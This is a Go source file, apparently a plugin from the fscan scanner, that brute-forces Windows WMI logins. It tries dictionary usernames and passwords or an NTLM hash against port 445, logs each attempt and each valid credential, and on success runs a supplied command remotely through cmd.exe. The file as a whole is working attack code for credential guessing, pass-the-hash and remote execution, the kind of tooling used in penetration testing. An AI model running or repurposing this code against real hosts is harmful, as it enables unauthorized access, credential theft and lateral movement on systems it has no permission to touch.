package Plugins

import (
	"errors"
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"github.com/shadow1ng/fscan/Config"
	"os"
	"strings"
	"time"

	"github.com/C-Sto/goWMIExec/pkg/wmiexec"
)

var ClientHost string
var flag bool

func init() {
	if flag {
		return
	}
	clientHost, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
	}
	ClientHost = clientHost
	flag = true
}

func WmiExec(info *Config.HostInfo) (tmperr error) {
	if Common.IsBrute {
		return nil
	}
	starttime := time.Now().Unix()
	for _, user := range Common.Userdict["smb"] {
	PASS:
		for _, pass := range Common.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := Wmiexec(info, user, pass, Common.Hash)
			errlog := fmt.Sprintf("[-] WmiExec %v:%v %v %v %v", info.Host, 445, user, pass, err)
			errlog = strings.Replace(errlog, "\n", "", -1)
			Common.LogError(errlog)
			if flag == true {
				var result string
				if Common.Domain != "" {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v\\%v ", info.Host, info.Ports, Common.Domain, user)
				} else {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v ", info.Host, info.Ports, user)
				}
				if Common.Hash != "" {
					result += "hash: " + Common.Hash
				} else {
					result += pass
				}
				Common.LogSuccess(result)
				return err
			} else {
				tmperr = err
				if Common.CheckErrs(err) {
					return err
				}
				if time.Now().Unix()-starttime > (int64(len(Common.Userdict["smb"])*len(Common.Passwords)) * Common.Timeout) {
					return err
				}
			}
			if len(Common.Hash) == 32 {
				break PASS
			}
		}
	}
	return tmperr
}

func Wmiexec(info *Config.HostInfo, user string, pass string, hash string) (flag bool, err error) {
	target := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	wmiexec.Timeout = int(Common.Timeout)
	return WMIExec(target, user, pass, hash, Common.Domain, Common.Command, ClientHost, "", nil)
}

func WMIExec(target, username, password, hash, domain, command, clientHostname, binding string, cfgIn *wmiexec.WmiExecConfig) (flag bool, err error) {
	if cfgIn == nil {
		cfg, err1 := wmiexec.NewExecConfig(username, password, hash, domain, target, clientHostname, true, nil, nil)
		if err1 != nil {
			err = err1
			return
		}
		cfgIn = &cfg
	}
	execer := wmiexec.NewExecer(cfgIn)
	err = execer.SetTargetBinding(binding)
	if err != nil {
		return
	}

	err = execer.Auth()
	if err != nil {
		return
	}
	flag = true

	if command != "" {
		command = "C:\\Windows\\system32\\cmd.exe /c " + command
		if execer.TargetRPCPort == 0 {
			err = errors.New("RPC Port is 0, cannot connect")
			return
		}

		err = execer.RPCConnect()
		if err != nil {
			return
		}
		err = execer.Exec(command)
		if err != nil {
			return
		}
	}
	return
}
